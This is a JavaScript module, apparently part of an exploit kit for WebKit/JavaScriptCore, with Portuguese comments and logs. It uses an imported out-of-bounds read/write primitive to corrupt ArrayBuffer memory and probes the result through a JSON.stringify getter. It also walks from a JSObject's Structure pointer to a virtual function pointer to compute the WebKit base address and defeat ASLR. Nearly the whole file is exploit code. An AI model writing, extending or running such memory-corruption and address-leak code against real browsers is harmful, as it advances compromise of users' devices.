// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    // oob_dataview_real, // Não usado diretamente nas novas funções, mas faz parte do trigger
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAnalysis";
let getter_called_flag = false;

const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const TARGET_WRITE_OFFSET_0x6C = 0x6C;
const OOB_AB_GENERAL_FILL_PATTERN = 0xFEFEFEFE;
const OOB_AB_SNOOP_WINDOW_SIZE = 0x100;

const LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C = [
    0xFEFEFEFE,
    0xCDCDCDCD,
    0x12345678,
    0x00000000,
    0xABABABAB,
    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2
];

let global_object_for_internal_stringify;
let current_test_results_for_subtest;

class CheckpointFor0x6CAnalysis {
    constructor(id) {
        this.id_marker = `Analyse0x6CChkpt-${id}`;
        this.prop_for_stringify_target = null;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "Analyse0x6C_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);

        if (!current_test_results_for_subtest) {
            logS3("ERRO FATAL GETTER: current_test_results_for_subtest não definido!", "critical", FNAME_GETTER);
            return { "error_getter_no_results_obj": true };
        }

        let details_log_g = [];

        try {
            if (!oob_array_buffer_real || !oob_read_absolute) {
                throw new Error("oob_ab ou oob_read_absolute não disponíveis.");
            }

            logS3(`DENTRO DO GETTER: Lendo QWORD de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}]...`, "info", FNAME_GETTER);
            const value_at_0x6C_qword = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);

            current_test_results_for_subtest.value_after_trigger_object = value_at_0x6C_qword;
            current_test_results_for_subtest.value_after_trigger_hex = value_at_0x6C_qword.toString(true);

            details_log_g.push(`Valor lido de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD): ${current_test_results_for_subtest.value_after_trigger_hex}`);
            logS3(details_log_g[details_log_g.length - 1], "leak", FNAME_GETTER);

            if (global_object_for_internal_stringify) {
                logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO (opcional)...", "info", FNAME_GETTER);
                try { JSON.stringify(global_object_for_internal_stringify); } catch (e_int_str) { details_log_g.push(`Erro stringify int: ${e_int_str.message}`); }
                details_log_g.push("Stringify interno (opcional) chamado.");
            }

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results_for_subtest.error = String(e_getter_main);
            current_test_results_for_subtest.message = (current_test_results_for_subtest.message || "") + ` Erro no getter: ${e_getter_main.message}`;
        }
        current_test_results_for_subtest.details_getter = details_log_g.join('; ');
        return { "getter_0x6C_analysis_complete": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointFor0x6CAnalysis.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return {
            id: this.id_marker,
            target_prop_val: this.prop_for_stringify_target,
            processed_by_0x6c_test: true
        };
    }
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST_RUNNER = "execute0x6CAnalysisRunner";
    logS3(`--- Iniciando Teste de Análise da Escrita em 0x6C (Corrigido) ---`, "test", FNAME_TEST_RUNNER);

    let overall_summary = [];

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3("Offsets Críticos Ausentes para Teste 0x6C", "critical", FNAME_TEST_RUNNER); return;
    }

    for (const initial_low_dword_planted of LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C) {
        getter_called_flag = false;
        current_test_results_for_subtest = {
            success: false,
            message: `Testando com padrão baixo ${toHex(initial_low_dword_planted)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}.`,
            error: null,
            pattern_planted_low_hex: toHex(initial_low_dword_planted),
            value_after_trigger_hex: null,
            value_after_trigger_object: null,
            details_getter: "",
            getter_actually_called: false
        };

        logS3(`INICIANDO SUB-TESTE 0x6C: Padrão baixo em ${toHex(TARGET_WRITE_OFFSET_0x6C)} será ${toHex(initial_low_dword_planted)}`, "subtest", FNAME_TEST_RUNNER);

        try {
            await triggerOOB_primitive();
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) { throw new Error("OOB Init ou primitivas R/W falharam para Teste 0x6C"); }
            logS3(`Ambiente OOB inicializado para Teste 0x6C. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);

            const fill_limit = Math.min(OOB_AB_SNOOP_WINDOW_SIZE, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                    (offset >= TARGET_WRITE_OFFSET_0x6C && offset < TARGET_WRITE_OFFSET_0x6C + 8)) {
                    continue;
                }
                try { oob_write_absolute(offset, OOB_AB_GENERAL_FILL_PATTERN, 4); } catch (e) { /* ignore */ }
            }
            oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, initial_low_dword_planted, 4);
            if (TARGET_WRITE_OFFSET_0x6C + 4 < oob_array_buffer_real.byteLength &&
                !(TARGET_WRITE_OFFSET_0x6C + 4 >= CORRUPTION_OFFSET_TRIGGER && TARGET_WRITE_OFFSET_0x6C + 4 < CORRUPTION_OFFSET_TRIGGER + 8)) {
                oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x00000000, 4);
            }
            const initial_qword_val = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
            logS3(`oob_ab preenchido. oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD inicial) = ${initial_qword_val.toString(true)}.`, "info", FNAME_TEST_RUNNER);

            global_object_for_internal_stringify = { "unique_id": 0xC0FFEE00 + initial_low_dword_planted, "data_payload": "GetterStressData" };

            oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
            logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

            const checkpoint_obj = new CheckpointFor0x6CAnalysis(1);
            checkpoint_obj.prop_for_stringify_target = global_object_for_internal_stringify;
            logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);

            JSON.stringify(checkpoint_obj);

            if (getter_called_flag && current_test_results_for_subtest.value_after_trigger_object) {
                const final_qword_val_obj = current_test_results_for_subtest.value_after_trigger_object;

                if (final_qword_val_obj.high() === 0xFFFFFFFF && final_qword_val_obj.low() === initial_low_dword_planted) {
                    current_test_results_for_subtest.success = true;
                    current_test_results_for_subtest.message = `SUCESSO! 0x6C: Alto=FFFFFFFF, Baixo=${toHex(final_qword_val_obj.low())} (preservado).`;
                } else if (final_qword_val_obj.high() === 0xFFFFFFFF) {
                    current_test_results_for_subtest.success = true;
                    current_test_results_for_subtest.message = `ANOMALIA! 0x6C: Alto=FFFFFFFF, Baixo=${toHex(final_qword_val_obj.low())} (ALTERADO de ${toHex(initial_low_dword_planted)}).`;
                } else {
                    current_test_results_for_subtest.message = `Valor em 0x6C (${final_qword_val_obj.toString(true)}) não teve Alto FFFFFFFF. Padrão Baixo Plantado: ${toHex(initial_low_dword_planted)}.`;
                }
            } else if (getter_called_flag) {
                current_test_results_for_subtest.message = current_test_results_for_subtest.message || "Getter chamado, mas valor de 0x6C não foi registrado/lido corretamente pelo getter.";
            } else {
                current_test_results_for_subtest.message = current_test_results_for_subtest.message || "Getter NÃO foi chamado para este sub-teste.";
            }
        } catch (mainError_runner_subtest) {
            current_test_results_for_subtest.message = `Erro CRÍTICO no sub-teste 0x6C: ${mainError_runner_subtest.message}`;
            current_test_results_for_subtest.error = String(mainError_runner_subtest) + (mainError_runner_subtest.stack ? `\nStack: ${mainError_runner_subtest.stack}` : '');
            logS3(current_test_results_for_subtest.message, "critical", FNAME_TEST_RUNNER);
            console.error(mainError_runner_subtest);
        } finally {
            current_test_results_for_subtest.getter_actually_called = getter_called_flag;

            logS3(`FIM DO SUB-TESTE 0x6C com padrão inicial ${toHex(initial_low_dword_planted)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}`, "subtest", FNAME_TEST_RUNNER);
            if (current_test_results_for_subtest.getter_actually_called) {
                logS3(`  Resultado Sub-Teste 0x6C: Success=${current_test_results_for_subtest.success}, Msg=${current_test_results_for_subtest.message}`, current_test_results_for_subtest.success ? "vuln" : "warn", FNAME_TEST_RUNNER);
                if (current_test_results_for_subtest.value_after_trigger_hex) {
                    logS3(`    Valor final em ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${current_test_results_for_subtest.value_after_trigger_hex}`, "leak", FNAME_TEST_RUNNER);
                }
                logS3(`    Detalhes do Getter: ${current_test_results_for_subtest.details_getter}`, "info", FNAME_TEST_RUNNER);
            } else {
                logS3(`  Resultado Sub-Teste 0x6C: GETTER NÃO FOI CHAMADO. Msg: ${current_test_results_for_subtest.message}`, "error", FNAME_TEST_RUNNER);
            }

            overall_summary.push(JSON.parse(JSON.stringify(current_test_results_for_subtest)));
            clearOOBEnvironment();
            global_object_for_internal_stringify = null;
            if (initial_low_dword_planted !== LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C[LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C.length - 1]) {
                await PAUSE_S3(100);
            }
        }
    }

    logS3("==== SUMÁRIO GERAL DO TESTE DE ANÁLISE DA ESCRITA EM 0x6C (Corrigido) ====", "test", FNAME_TEST_RUNNER);
    overall_summary.forEach(res_item => {
        logS3(`Padrão Plantado (Low DWORD em ${toHex(TARGET_WRITE_OFFSET_0x6C)}): ${res_item.pattern_planted_low_hex}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Getter Chamado: ${res_item.getter_actually_called}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Sucesso (Anomalia Útil em 0x6C): ${res_item.success}`, res_item.success ? "vuln" : "info", FNAME_TEST_RUNNER);
        logS3(`  Mensagem: ${res_item.message}`, "info", FNAME_TEST_RUNNER);
        if (res_item.value_after_trigger_hex) {
            logS3(`    Valor Final Lido de ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${res_item.value_after_trigger_hex}`, "leak", FNAME_TEST_RUNNER);
        }
        if (res_item.details_getter) logS3(`    Detalhes Getter: ${res_item.details_getter}`, "info", FNAME_TEST_RUNNER);
        if (res_item.error) logS3(`  Erro: ${res_item.error}`, "error", FNAME_TEST_RUNNER);
        logS3("----------------------------------------------------", "info", FNAME_TEST_RUNNER);
    });

    logS3(`--- Teste de Análise da Escrita em 0x6C (Corrigido) Concluído ---`, "test", FNAME_TEST_RUNNER);
}


// NOVA FUNÇÃO: Estratégia para tentar vazar o endereço base do WebKit (Refinada)
// ============================================================================
export async function attemptWebKitBaseLeakStrategy() {
    const FNAME_LEAK_RUNNER = "attemptWebKitBaseLeakStrategy";
    logS3(`--- Iniciando Estratégia de Vazamento de Endereço Base do WebKit (v2) ---`, "test", FNAME_LEAK_RUNNER);

    if (!JSC_OFFSETS.JSCell || !JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET ||
        !JSC_OFFSETS.Structure || !JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET ||
        !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS || !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]) {
        logS3("ERRO: Offsets críticos para vazamento de base não definidos em config.mjs.", "critical", FNAME_LEAK_RUNNER);
        logS3("   Necessário: JSCell.STRUCTURE_POINTER_OFFSET, Structure.VIRTUAL_PUT_OFFSET, e uma função alvo em WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS (ex: 'JSC::JSObject::put').", "critical", FNAME_LEAK_RUNNER);
        return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_read_absolute) {
            throw new Error("OOB Init ou primitiva de leitura falharam.");
        }
        logS3("Ambiente OOB inicializado para tentativa de vazamento de base.", "info", FNAME_LEAK_RUNNER);

        // --- PASSO 1: Identificar (ou posicionar) um JSObject e obter seu endereço ---
        // Este valor é um EXEMPLO e DEVE SER SUBSTITUÍDO pela sua lógica de localização de objeto.
        const HYPOTHETICAL_OFFSET_TO_JSOBJECT = 0x2000; // EXEMPLO! Mude isso!

        logS3(`PASSO 1: Tentando usar um JSObject hipotético no offset ${toHex(HYPOTHETICAL_OFFSET_TO_JSOBJECT)} do oob_buffer.`, "info", FNAME_LEAK_RUNNER);
        logS3(`   Lembre-se: Este offset (${toHex(HYPOTHETICAL_OFFSET_TO_JSOBJECT)}) é um EXEMPLO e precisa ser determinado pelo seu exploit.`, "warn", FNAME_LEAK_RUNNER);

        // --- PASSO 2: Ler o ponteiro Structure* do JSObject ---
        const address_of_jsobject_for_struct_ptr = HYPOTHETICAL_OFFSET_TO_JSOBJECT;
        const structure_ptr_field_addr = address_of_jsobject_for_struct_ptr + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
        logS3(`PASSO 2: Lendo o Structure* do campo em ${toHex(address_of_jsobject_for_struct_ptr)} + ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)} = ${toHex(structure_ptr_field_addr)}.`, "info", FNAME_LEAK_RUNNER);

        let structure_obj_ptr_adv64;
        try {
            structure_obj_ptr_adv64 = oob_read_absolute(structure_ptr_field_addr, 8);
            if (!isAdvancedInt64Object(structure_obj_ptr_adv64) || (structure_obj_ptr_adv64.low() === 0 && structure_obj_ptr_adv64.high() === 0)) {
                logS3(`   LEITURA FALHOU ou ponteiro Structure* nulo/inválido lido de ${toHex(structure_ptr_field_addr)}: ${structure_obj_ptr_adv64?.toString(true) || "Não é AdvInt64"}`, "error", FNAME_LEAK_RUNNER);
                throw new Error(`Ponteiro Structure* inválido ou nulo lido.`);
            }
            logS3(`   Structure* (bruto) lido: ${structure_obj_ptr_adv64.toString(true)}`, "leak", FNAME_LEAK_RUNNER);
        } catch (e) {
            logS3(`   ERRO ao ler o ponteiro Structure*: ${e.message}. Verifique o offset do objeto e sua estabilidade.`, "critical", FNAME_LEAK_RUNNER);
            throw e;
        }
        
        // IMPORTANTE: O valor de structure_obj_ptr_adv64 é o ENDEREÇO do objeto Structure.
        // Para ler DENTRO do objeto Structure usando oob_read_absolute, este endereço PRECISA ser um offset
        // válido DENTRO do seu oob_array_buffer_real. Se for um ponteiro absoluto para fora do buffer,
        // oob_read_absolute (como está implementado) não funcionará.
        // Você precisaria de uma primitiva de leitura arbitrária (addr_read) para ler de endereços absolutos.
        // Para este exemplo, VAMOS ASSUMIR que o objeto Structure está magicamente localizado em um offset
        // dentro do oob_array_buffer_real que corresponde ao valor numérico do ponteiro Structure* lido.
        // Esta é uma suposição MUITO FORTE e irrealista sem uma primitiva addrof + leitura arbitrária.
        // Em um exploit real, você usaria addrof(obj_structure) se pudesse, ou teria que posicionar o obj_structure
        // em um local conhecido dentro da sua janela OOB.
        let structure_obj_address_for_read;
        if (structure_obj_ptr_adv64.high() !== 0) { // Heurística muito simples para ponteiro "real" vs offset pequeno
            logS3(`   AVISO: Structure* ${structure_obj_ptr_adv64.toString(true)} parece um ponteiro absoluto. A leitura de VIRTUAL_PUT_OFFSET pode falhar se não tivermos leitura arbitrária ou se Structure não estiver em OOB.`, "warn", FNAME_LEAK_RUNNER);
            // Para fins de demonstração, se for um ponteiro "grande", não tentaremos usá-lo como offset OOB direto.
            // Em um exploit real, aqui você usaria sua primitiva de leitura arbitrária baseada no valor de structure_obj_ptr_adv64.
            // Ou, se você pulverizou Structures, você procuraria uma Structure em um offset conhecido.
            // Por enquanto, vamos lançar um erro se parecer um ponteiro absoluto para forçar o ajuste do HYPOTHETICAL_OFFSET.
             throw new Error("Structure* parece ser um ponteiro absoluto, necessita de leitura arbitrária ou melhor posicionamento.");
        } else {
            // Se high for 0, tratamos low como um offset dentro do oob_array_buffer_real.
            structure_obj_address_for_read = structure_obj_ptr_adv64.low();
        }
        
        logS3(`   Endereço do objeto Structure (para leitura, assumido como offset OOB): ${toHex(structure_obj_address_for_read, 64)}`, "info", FNAME_LEAK_RUNNER);


        // --- PASSO 3: Ler o ponteiro da função virtual (ex: put) de Structure ---
        const virtual_put_func_ptr_field_addr = structure_obj_address_for_read + JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
        logS3(`PASSO 3: Lendo o ponteiro da função virtual (ex: put) de Structure em ${toHex(structure_obj_address_for_read,64)} + ${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)} = ${toHex(virtual_put_func_ptr_field_addr,64)}.`, "info", FNAME_LEAK_RUNNER);

        let leaked_virtual_func_ptr;
        try {
            leaked_virtual_func_ptr = oob_read_absolute(virtual_put_func_ptr_field_addr, 8);
            if (!isAdvancedInt64Object(leaked_virtual_func_ptr) || (leaked_virtual_func_ptr.low() === 0 && leaked_virtual_func_ptr.high() === 0)) {
                logS3(`   LEITURA FALHOU ou ponteiro de função virtual nulo/inválido lido de ${toHex(virtual_put_func_ptr_field_addr,64)}: ${leaked_virtual_func_ptr?.toString(true) || "Não é AdvInt64"}`, "error", FNAME_LEAK_RUNNER);
                throw new Error(`Ponteiro de função virtual inválido ou nulo lido.`);
            }
            logS3(`   Ponteiro de função virtual (bruto) lido: ${leaked_virtual_func_ptr.toString(true)}`, "leak", FNAME_LEAK_RUNNER);
        } catch (e) {
            logS3(`   ERRO ao ler o ponteiro da função virtual: ${e.message}.`, "critical", FNAME_LEAK_RUNNER);
            throw e;
        }

        // --- PASSO 4: Calcular o endereço base do WebKit ---
        // Assumimos que o VIRTUAL_PUT_OFFSET aponta para uma função como JSC::JSObject::put.
        const targetFunctionName = "JSC::JSObject::put"; // Ou qualquer outra função que VIRTUAL_PUT_OFFSET possa apontar e que esteja no config.
        const offset_of_target_function_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[targetFunctionName];

        if (!offset_of_target_function_str) {
            logS3(`   ERRO: Offset para a função alvo "${targetFunctionName}" não encontrado em WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS.`, "critical", FNAME_LEAK_RUNNER);
            throw new Error(`Offset para ${targetFunctionName} não configurado.`);
        }

        const offset_of_target_function = new AdvancedInt64(offset_of_target_function_str);
        logS3(`PASSO 4: Calculando o endereço base do WebKit.`, "info", FNAME_LEAK_RUNNER);
        logS3(`   Usando leaked_func_ptr (${leaked_virtual_func_ptr.toString(true)}) - offset de "${targetFunctionName}" (${offset_of_target_function.toString(true)}).`, "info", FNAME_LEAK_RUNNER);

        const webkit_base_address = leaked_virtual_func_ptr.sub(offset_of_target_function);

        logS3(`   ENDEREÇO BASE DO WEBKIT (calculado): ${webkit_base_address.toString(true)}`, "vuln", FNAME_LEAK_RUNNER);
        document.title = "WebKit Base: " + webkit_base_address.toString(true);

        if (webkit_base_address.low() === 0 && webkit_base_address.high() === 0) {
            logS3("   AVISO: Endereço base calculado é zero. Isso é improvável.", "warn", FNAME_LEAK_RUNNER);
        } else if (webkit_base_address.low() & 0xFFF) {
            logS3(`   AVISO: Endereço base ${webkit_base_address.toString(true)} não parece alinhado à página (últimos 3 hexits deveriam ser 000).`, "warn", FNAME_LEAK_RUNNER);
        } else {
            logS3("   Endereço base CALCULADO e parece alinhado à página! VERIFIQUE MANUALMENTE!", "good", FNAME_LEAK_RUNNER);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO na estratégia de vazamento de base: ${e.message}`, "critical", FNAME_LEAK_RUNNER);
        if (e.stack) {
            logS3(`Stack: ${e.stack}`, "critical", FNAME_LEAK_RUNNER);
        }
        document.title = "WebKit Base Leak FAIL!";
    } finally {
        clearOOBEnvironment();
        logS3("--- Estratégia de Vazamento de Endereço Base do WebKit (v2) Concluída ---", "test", FNAME_LEAK_RUNNER);
    }
}
